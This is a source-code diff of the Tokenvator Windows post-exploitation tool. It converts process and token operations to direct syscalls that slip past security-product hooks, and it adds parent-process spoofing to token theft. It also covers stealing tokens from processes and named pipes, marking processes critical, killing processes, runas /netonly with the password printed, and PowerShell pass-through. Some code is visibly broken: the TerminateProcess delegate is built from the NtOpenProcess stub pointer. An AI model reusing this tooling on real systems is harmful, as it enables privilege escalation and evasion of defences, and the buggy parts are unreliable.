+        /// Marks or unmarks a process as being critical
+        /// Converted to D/Invoke Syscalls
+        /// QA OK
+        /// </summary>
+        /// <param name="cLP"></param>
+        /// <param name="hProcess"></param>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _SetCriticalProcess(CommandLineParsing cLP, IntPtr hProcess)
+        [SecurityCritical]
+        [HandleProcessCorruptedStateExceptions]
+        private void _SetCriticalProcess()
         {
+            IntPtr hProcess = new IntPtr();
+
             string sSetting;
             cLP.GetData("state", out sSetting);
 
@@ -736,40 +1037,86 @@ namespace Tokenvator
                 Console.WriteLine("[-] Invalid Boolean Specified: {0}", sSetting);
                 return;
             }
-            
+
             uint uSetting = Convert.ToUInt32(bSetting);
             if (cLP.Remote)
             {
-                hProcess = kernel32.OpenProcess(ProcessThreadsApi.ProcessSecurityRights.PROCESS_SET_INFORMATION, false, (uint)cLP.ProcessID);
-                if (IntPtr.Zero == hProcess)
+                ////////////////////////////////////////////////////////////////////////////////
+                // kernel32.OpenProcess(ProcessThreadsApi.ProcessSecurityRights.PROCESS_SET_INFORMATION, false, (uint)cLP.ProcessID);
+                ////////////////////////////////////////////////////////////////////////////////
+                IntPtr hNtOpenProcess = Generic.GetSyscallStub("NtOpenProcess");
+                MonkeyWorks.ntdll.NtOpenProcess fSyscallNtOpenProcess = (MonkeyWorks.ntdll.NtOpenProcess)Marshal.GetDelegateForFunctionPointer(hNtOpenProcess, typeof(MonkeyWorks.ntdll.NtOpenProcess));
+
+                MonkeyWorks.ntdll.OBJECT_ATTRIBUTES objectAttributes = new MonkeyWorks.ntdll.OBJECT_ATTRIBUTES();
+                ntbasic.CLIENT_ID clientId = new ntbasic.CLIENT_ID
                 {
-                    Misc.GetWin32Error("OpenProcess");
-                    kernel32.CloseHandle(hProcess);
+                    UniqueProcess = new IntPtr(cLP.ProcessID)
+                };
+
+                uint retVal = 0;
+                try
+                {
+                    retVal = fSyscallNtOpenProcess(ref hProcess, ProcessThreadsApi.ProcessSecurityRights.PROCESS_SET_INFORMATION, ref objectAttributes, ref clientId);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[-] NtOpenProcess Generated an Exception");
+                    Console.WriteLine("[-] {0}", ex.Message);
+                    return;
+                }
+
+                if (0 != retVal)
+                {
+                    Misc.GetNtError("NtOpenProcess", retVal);
                     return;
                 }
             }
 
-            uint status = ntdll.NtSetInformationProcess(hProcess, ntdll._PROCESS_INFORMATION_CLASS.ProcessBreakOnTermination, ref uSetting, (uint)System.Runtime.InteropServices.Marshal.SizeOf(typeof(uint)));
-            if (0 != status)
+            ////////////////////////////////////////////////////////////////////////////////
+            // ntdll.NtSetInformationProcess(hProcess, ntdll._PROCESS_INFORMATION_CLASS.ProcessBreakOnTermination, ref uSetting, (uint)System.Runtime.InteropServices.Marshal.SizeOf(typeof(uint)));
+            ////////////////////////////////////////////////////////////////////////////////
+            IntPtr hNtSetInformationProcess = Generic.GetSyscallStub("NtSetInformationProcess");
+            MonkeyWorks.ntdll.NtSetInformationProcess fSyscallNtSetInformationProcess = (MonkeyWorks.ntdll.NtSetInformationProcess)Marshal.GetDelegateForFunctionPointer(hNtSetInformationProcess, typeof(MonkeyWorks.ntdll.NtSetInformationProcess));
+
+            uint ntRetVal = 0;
+            try
             {
-                Misc.GetNtError("NtSetInformationProcess", status);
-                kernel32.CloseHandle(hProcess);
+                ntRetVal = fSyscallNtSetInformationProcess(hProcess, MonkeyWorks.ntdll._PROCESS_INFORMATION_CLASS.ProcessBreakOnTermination, ref uSetting, (uint)Marshal.SizeOf(typeof(uint)));
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] NtOpenProcess Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
                 return;
             }
-            
-            if (bSetting)
-                Console.WriteLine("[+] Process {0} is Marked as Critical", cLP.ProcessID);
-            else
-                Console.WriteLine("[+] Process {0} is Unmarked as Critical", cLP.ProcessID);
 
-            kernel32.CloseHandle(hProcess);
+            if (0 != ntRetVal)
+            {
+                Misc.GetNtError("NtSetInformationProcess", ntRetVal);
+                //AccessTokens.CloseHandle(hProcess);
+                return;
+            }
+
+            if (bSetting)
+            {
+                Console.WriteLine("[+] Process {0} is Marked as Critical", cLP.ProcessID);
+            }
+            else
+            {
+                Console.WriteLine("[+] Process {0} is Unmarked as Critical", cLP.ProcessID);
+            }
+
+            //AccessTokens.CloseHandle(hProcess);
             return;
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Starts the KernelTokens Driver
+        /// <summary>
+        /// Starts the KernelTokens Driver
+        /// No conversions required
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _StartDriver(CommandLineParsing cLP)
+        private void _StartDriver()
         {
             string sn;
             if (!cLP.GetData("ServiceName", out sn))
@@ -777,7 +1124,6 @@ namespace Tokenvator
                 Console.WriteLine("[-] ServiceName not set");
                 return;
             }
-
 
             PSExec p = new PSExec(sn);
             if (!p.Connect("."))
@@ -792,13 +1138,19 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        //
+        /// <summary>
+        /// Duplicates a token from another process - either impersonates or creates a 
+        /// new process
+        /// No conversions required
+        /// QA OK
+        /// </summary>
+        /// <returns></returns>
         ////////////////////////////////////////////////////////////////////////////////
-        private static bool _StealToken(CommandLineParsing cLP, IntPtr hToken)
+        private bool _StealToken()
         {
-            using (TokenManipulation t = new TokenManipulation(hToken))
+            using (TokenManipulation t = new TokenManipulation(currentProcessToken))
             {
-                
+
                 if (string.IsNullOrWhiteSpace(cLP.Command))
                 {
                     if (0 != cLP.ProcessID && t.OpenProcessToken(cLP.ProcessID))
@@ -825,7 +1177,7 @@ namespace Tokenvator
                     if (0 != cLP.ProcessID && t.OpenProcessToken(cLP.ProcessID))
                     {
                         t.SetWorkingTokenToRemote();
-                        if (!t.DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
+                        if (!t.DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, Winnt._TOKEN_TYPE.TokenPrimary))
                         {
                             return false;
                         }
@@ -841,19 +1193,52 @@ namespace Tokenvator
                         return false;
                     }
 
-                    if (t.StartProcessAsUser(cLP.Command))
+                    uint previousPid = 0;
+                    uint discard;
+
+                    if (0 != cLP.PPID)
                     {
-                        return true;
+                        if(!CreateProcess.SpoofParentProcess(cLP.PPID, out previousPid))
+                        {
+                            return false;
+                        }
                     }
+
+                    if (!t.StartProcessAsUser(cLP.Command))
+                    {
+                        if (0 != cLP.PPID)
+                        {
+                            // restore state
+                            
+                            if (!CreateProcess.SpoofParentProcess(previousPid, out discard))
+                            {
+                                //My head really hurts, figure out later
+                            }
+                        }
+
+                        return false;
+                    }
+
+                    if (!CreateProcess.SpoofParentProcess(previousPid, out discard))
+                    {
+                        //My head really hurts, figure out later
+                    }
+
+
+                    Console.WriteLine("\n[*] If a new windows doesn't appear, it may be nessessary to run Clear_Desktop_Acl");
                 }
-                return false;
+                return true;
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Steal a token from a named pipe, has some wierd corner cases
+        /// <summary>
+        /// Steal a token from a named pipe, has some wierd corner cases
+        /// No conversions required
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _StealPipeToken(CommandLineParsing cLP)
+        private void _StealPipeToken()
         {
             if (string.IsNullOrEmpty(cLP.PipeName))
             {
@@ -863,88 +1248,165 @@ namespace Tokenvator
 
             if (string.IsNullOrEmpty(cLP.Command))
             {
-                
-                NamedPipes.GetPipeToken(cLP.PipeName);
+                using (NamedPipes np = new NamedPipes())
+                {
+                    np.GetPipeToken(cLP.PipeName);
+                }
+
+                Console.WriteLine("[*] Operating as {0}", WindowsIdentity.GetCurrent().Name);
             }
             else
             {
                 Console.WriteLine("[*] Running {0}", cLP.CommandAndArgs);
-                NamedPipes.GetPipeToken(cLP.PipeName, cLP.Command, cLP.Arguments);
+                using (NamedPipes np = new NamedPipes())
+                {
+                    np.GetPipeToken(cLP.PipeName, cLP.Command, cLP.Arguments);
+                }
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Read command input for the Run Command
+        /// <summary>
+        /// Read command input for the Run Command
+        /// No conversions required
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _SubProcessStdIn()
+        private void _SubProcessStdIn()
         {
             try
             {
-                var reader = new System.IO.StreamReader(Console.OpenStandardInput());
+                var reader = new StreamReader(Console.OpenStandardInput());
                 while (!reader.EndOfStream)
+                {
                     process.StandardInput.WriteLine(reader.ReadLine());
+                }
             }
             catch (Exception ex)
             {
                 if (!(ex is ThreadAbortException))
+                {
                     Console.Error.WriteLine("GiveProcStdIn:" + ex.Message);
+                }
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Read command input for the Run Command
+        /// <summary>
+        /// Read command input for the Run Command
+        /// No conversions required
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _SubProcessStdOut()
+        private void _SubProcessStdOut()
         {
             try
             {
-                System.IO.StreamReader reader = process.StandardOutput;
+                StreamReader reader = process.StandardOutput;
                 while (!reader.EndOfStream)
+                {
                     Console.WriteLine(reader.ReadLine());
+                }
 
                 reader = process.StandardError;
                 while (!reader.EndOfStream)
+                {
                     Console.WriteLine(reader.ReadLine());
+                }
             }
             catch (Exception ex)
             {
                 if (!(ex is ThreadAbortException))
+                {
                     Console.Error.WriteLine("ShowProcStdOut:" + ex.Message);
+                }
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Terminates a given process
+        /// <summary>
+        /// Terminates a given process
+        /// Converted to D/Invoke Syscalls
+        /// Not Terminating?
+        /// </summary>
+        /// <param name="cLP"></param>
+        /// <param name="hProcess"></param>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _Terminate(CommandLineParsing cLP)
+        private void _Terminate()
         {
-            if (cLP.Remote)
-            {
-                IntPtr hProcess = kernel32.OpenProcess(ProcessThreadsApi.ProcessSecurityRights.PROCESS_TERMINATE, false, (uint)cLP.ProcessID);
-                if (IntPtr.Zero == hProcess)
-                {
-                    Misc.GetWin32Error("OpenProcess");
-                    return;
-                }
-                Console.WriteLine("[*] Recieved Process Handle 0x{0}", hProcess.ToString("X4"));
+            IntPtr hProcess = new IntPtr();
 
-                if (!kernel32.TerminateProcess(hProcess, 0))
-                {
-                    Misc.GetWin32Error("TerminateProcess");
-                    return;
-                }
-                Console.WriteLine("[+] Process Terminated");
-            }
-            else
+            ////////////////////////////////////////////////////////////////////////////////
+            // kernel32.OpenProcess(ProcessThreadsApi.ProcessSecurityRights.PROCESS_SET_INFORMATION, false, (uint)cLP.ProcessID);
+            ////////////////////////////////////////////////////////////////////////////////
+            IntPtr hNtOpenProcess = Generic.GetSyscallStub("NtOpenProcess");
+            var fSyscallNtOpenProcess = (MonkeyWorks.ntdll.NtOpenProcess)Marshal.GetDelegateForFunctionPointer(hNtOpenProcess, typeof(MonkeyWorks.ntdll.NtOpenProcess));
+
+            MonkeyWorks.ntdll.OBJECT_ATTRIBUTES objectAttributes = new MonkeyWorks.ntdll.OBJECT_ATTRIBUTES();
+            ntbasic.CLIENT_ID clientId = new ntbasic.CLIENT_ID
             {
-                Console.WriteLine("[-] Unable to identify Process ID");
+                UniqueProcess = new IntPtr(cLP.ProcessID)
+            };
+
+            uint ntRetVal = 0;
+            try
+            {
+                ntRetVal = fSyscallNtOpenProcess(ref hProcess, ProcessThreadsApi.ProcessSecurityRights.PROCESS_TERMINATE, ref objectAttributes, ref clientId);
             }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] NtOpenProcess Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
+                return;
+            }
+
+            if (0 != ntRetVal)
+            {
+                Misc.GetNtError("NtOpenProcess", ntRetVal);
+                return;
+            }
+
+            Console.WriteLine("[*] Recieved Process Handle 0x{0}", hProcess.ToString("X4"));
+
+            ////////////////////////////////////////////////////////////////////////////////
+            // kernel32.TerminateProcess(hProcess, 0)
+            // IntPtr hNtTerminateProcess = Generic.GetSyscallStub("NtTerminateProcess");
+            // var fSyscallNtTerminateProcess = (MonkeyWorks.ntdll.NtTerminateProcess)Marshal.GetDelegateForFunctionPointer(hNtOpenProcess, typeof(MonkeyWorks.ntdll.NtTerminateProcess));
+            ////////////////////////////////////////////////////////////////////////////////
+
+            IntPtr hkernel32 = Generic.GetPebLdrModuleEntry("kernel32.dll");
+            IntPtr hTerminateProcess = Generic.GetExportAddress(hkernel32, "TerminateProcess");
+            var fTerminateProcess = (MonkeyWorks.kernel32.TerminateProcess)Marshal.GetDelegateForFunctionPointer(hNtOpenProcess, typeof(MonkeyWorks.kernel32.TerminateProcess));
+
+            bool retVal = false;
+            try
+            {
+                retVal = fTerminateProcess(hProcess, 0);
+            }
+            catch (Exception ex)
+            {
+                Misc.GetExceptionMessage(ex, "TerminateProcess");
+                return;
+            }
+            finally
+            {
+                //AccessTokens.CloseHandle(hProcess);
+            }
+
+            if (!retVal)
+            {
+                Misc.GetNtError("TerminateProcess", ntRetVal);
+                return;
+            }
+
+            Console.WriteLine("[+] Process Terminated");
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        //
+        /// <summary>
+        /// Unfreezes a token via a driver
+        /// No conversions required
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _UnfreezeToken(CommandLineParsing cLP)
+        private void _UnfreezeToken()
         {
             using (TokenDriver td = new TokenDriver())
             {
@@ -954,16 +1416,23 @@ namespace Tokenvator
                     return;
                 }
                 if (cLP.Remote)
+                {
                     td.UnFreezeToken((uint)cLP.ProcessID);
+                }
                 else
+                {
                     td.UnFreezeToken();
+                }
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        //
+        /// <summary>
+        /// Uninstalls the token driver
+        /// No conversions required
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _UnInstallDriver(CommandLineParsing cLP)
+        private void _UnInstallDriver()
         {
             string service;
             if (cLP.GetData("servicename", out service))
@@ -990,9 +1459,13 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Runs a cmd prompt command
+        /// <summary>
+        /// Runs a cmd prompt command
+        /// No conversions required
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _Run(CommandLineParsing cLP)
+        private void _Run()
         {
             process = new Process();
             process.StartInfo.FileName = cLP.Command;
@@ -1019,9 +1492,13 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // This is probably going to break on certain consoles - e.g. Hangul || Kanji
+        /// <summary>
+        /// Emulates the functionality for runas /netonly
+        /// Migrated to Move this to CreateTokens & CreateProcess
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _RunAsNetOnly(CommandLineParsing cLP)
+        private void _RunAsNetOnly()
         {
             string[] domain_user;
             string domain;
@@ -1065,109 +1542,103 @@ namespace Tokenvator
             Console.WriteLine("[*] Username: {0}", username);
             Console.WriteLine("[*] Domain:   {0}", domain);
             Console.WriteLine("[*] Password: {0}", password);
+            Console.WriteLine("[*] Command: {0}", cLP.Command);
 
+            CreateProcess.CreateProcessWithLogonW(username, domain, password, cLP.Command, cLP.Arguments);
+
+            /*
             if (string.IsNullOrEmpty(cLP.Command))
             {
-                IntPtr phToken;
-                bool retVal = advapi32.LogonUser(
-                    username, domain, password,
-                    Winbase.LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS,
-                    Winbase.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT,
-                    out phToken
-                );
-
-                if (!retVal || IntPtr.Zero == phToken)
+                using(CreateTokens ct = new CreateTokens())
                 {
-                    Misc.GetWin32Error("LogonUser");
-                    return;
+                    ct.LogonUser(
+                        domain,
+                        username,
+                        password,
+                        Winbase.LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS, 
+                        string.Empty, 
+                        string.Empty
+                    );
                 }
-
-                Winbase._SECURITY_ATTRIBUTES securityAttributes = new Winbase._SECURITY_ATTRIBUTES();
-                IntPtr phNewToken;
-                advapi32.DuplicateTokenEx(
-                    phToken,
-                    (uint)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED, 
-                    ref securityAttributes,
-                    Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
-                    Winnt._TOKEN_TYPE.TokenImpersonation, 
-                    out phNewToken
-                );
-
-                kernel32.CloseHandle(phToken);
-
-                if (!retVal || IntPtr.Zero == phNewToken)
-                {
-                    Misc.GetWin32Error("DuplicateTokenEx");
-                    return;
-                }
-
-                WindowsIdentity newId = new WindowsIdentity(phNewToken);
-                WindowsImpersonationContext impersonatedUser = newId.Impersonate();
-                Console.WriteLine("[*] If you run \"info /all\", you should now see a thread token in the primary thread.");
-
-                if (!retVal)
-                {
-                    Misc.GetWin32Error("ImpersonateLoggedOnUser");
-                    return;
-                }
-
-                Console.WriteLine("[+] Operating As: {0}", WindowsIdentity.GetCurrent().Name);
             }
             else
             {
-                Console.WriteLine("[*] Command: {0}", cLP.Command);
-
-                Winbase._STARTUPINFO startupInfo = new Winbase._STARTUPINFO
-                {
-                    cb = (uint)System.Runtime.InteropServices.Marshal.SizeOf(typeof(Winbase._STARTUPINFO))
-                };
-
-                Winbase._PROCESS_INFORMATION processInformation;
-                bool retVal = advapi32.CreateProcessWithLogonW(
-                    username, domain, password,
-                    Winbase.LOGON_FLAGS.LOGON_NETCREDENTIALS_ONLY,
-                    cLP.Command, 
-                    cLP.Arguments,
-                    Winbase.CREATION_FLAGS.CREATE_NEW_PROCESS_GROUP,
-                    IntPtr.Zero, 
-                    Environment.CurrentDirectory,
-                    ref startupInfo,
-                    out processInformation
-                );              
-
-                if (!retVal)
-                {
-                    Misc.GetWin32Error("CreateProcessWithLogonW");
-                    return;
-                }
-
-                Console.WriteLine("[+] Process ID: {0}", processInformation.dwProcessId);
-                Console.WriteLine("[+] Thread ID:  {0}", processInformation.dwThreadId);
             }
+            */
+
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Pass through powershell command
+        /// <summary>
+        /// Pass through powershell command
+        /// No conversions required
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
-        private static void _RunPowerShell(CommandLineParsing cLP)
+        private void _RunPowerShell()
         {
-            Runspace runspace = RunspaceFactory.CreateRunspace();
-            runspace.Open();
-            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
-            Pipeline pipeline = runspace.CreatePipeline();
-            pipeline.Commands.AddScript(cLP.Command);
-            pipeline.Commands.Add("Out-String");
-            Collection<PSObject> results = pipeline.Invoke();
-            runspace.Close();
-
-            foreach (PSObject obj in results)
+            using (Runspace runspace = RunspaceFactory.CreateRunspace())
             {
-                Console.WriteLine(obj.ToString());
+                runspace.Open();
+
+                using (PowerShell ps = PowerShell.Create())
+                {
+                    ps.Runspace = runspace;
+
+                    ps.AddStatement().AddScript(cLP.CommandAndArgs);
+
+                    var outputCollection = new PSDataCollection<object>();
+
+                    ps.Streams.Error.DataAdded += (sender, e) =>
+                    {
+                        Console.WriteLine("Error");
+                        foreach (ErrorRecord er in ps.Streams.Error.ReadAll())
+                        {
+                            outputCollection.Add(er);
+                        }
+                    };
+                    ps.Streams.Verbose.DataAdded += (sender, e) =>
+                    {
+                        foreach (VerboseRecord vr in ps.Streams.Verbose.ReadAll())
+                        {
+                            outputCollection.Add(vr);
+                        }
+                    };
+                    ps.Streams.Debug.DataAdded += (sender, e) =>
+                    {
+                        foreach (DebugRecord dr in ps.Streams.Debug.ReadAll())
+                        {
+
+                            outputCollection.Add(dr);
+                        }
+                    };
+                    ps.Streams.Warning.DataAdded += (sender, e) =>
+                    {
+                        foreach (WarningRecord wr in ps.Streams.Warning)
+                        {
+                            outputCollection.Add(wr);
+                        }
+                    };
+
+                    ps.Invoke(null, outputCollection);
+
+                    Console.WriteLine(string.Join(
+                        Environment.NewLine,
+                        outputCollection
+                        .Where(R => R != null)
+                        .Select(R => R.ToString())
+                        .ToArray()
+                    ));
+                }
             }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Prints the generic help menu that lists the commands
+        /// <summary>
+        /// Prints the generic help menu that lists the commands
+        /// No conversions required
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
         private static void _HelpMenu()
         {
@@ -1187,13 +1658,17 @@ namespace Tokenvator
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Prints an example for a specific command
+        /// <summary>
+        /// Prints an example for a specific command
+        /// No conversions required
+        /// QA OK
+        /// </summary>
         ////////////////////////////////////////////////////////////////////////////////
         private static void _HelpItem(string input)
         {
             if ("privileges" == input.ToLower())
             {
-                foreach (string item in TokenManipulation.validPrivileges)
+                foreach (string item in CommandLineParsing.Privileges)
                 {
                     Console.WriteLine(item);
                 }
@@ -1213,39 +1688,6 @@ namespace Tokenvator
                 }
             }
 
-        }
-    }
-
-    public static class ProcessExtensions
-    {
-        private static string FindIndexedProcessName(int pid)
-        {
-            var processName = Process.GetProcessById(pid).ProcessName;
-            var processesByName = Process.GetProcessesByName(processName);
-            string processIndexdName = null;
-
-            for (var index = 0; index < processesByName.Length; index++)
-            {
-                processIndexdName = index == 0 ? processName : processName + "#" + index;
-                var processId = new PerformanceCounter("Process", "ID Process", processIndexdName);
-                if ((int)processId.NextValue() == pid)
-                {
-                    return processIndexdName;
-                }
-            }
-
-            return processIndexdName;
-        }
-
-        private static Process FindPidFromIndexedProcessName(string indexedProcessName)
-        {
-            var parentId = new PerformanceCounter("Process", "Creating Process ID", indexedProcessName);
-            return Process.GetProcessById((int)parentId.NextValue());
-        }
-
-        public static Process Parent(this Process process)
-        {
-            return FindPidFromIndexedProcessName(FindIndexedProcessName(process.Id));
         }
     }
 }
